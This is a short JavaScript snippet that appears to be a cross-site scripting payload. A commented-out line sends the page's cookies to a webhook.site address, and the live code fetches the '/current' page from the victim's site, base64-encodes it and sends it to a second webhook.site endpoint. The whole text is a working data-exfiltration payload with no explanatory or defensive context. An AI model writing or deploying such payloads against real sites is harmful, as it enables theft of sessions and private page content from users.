// fetch('https://webhook.site/0c9edde2-c363-47be-8a34-7816750a41f5/?c=' + document.cookie)
fetch('/current')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?d=' + btoa(t)));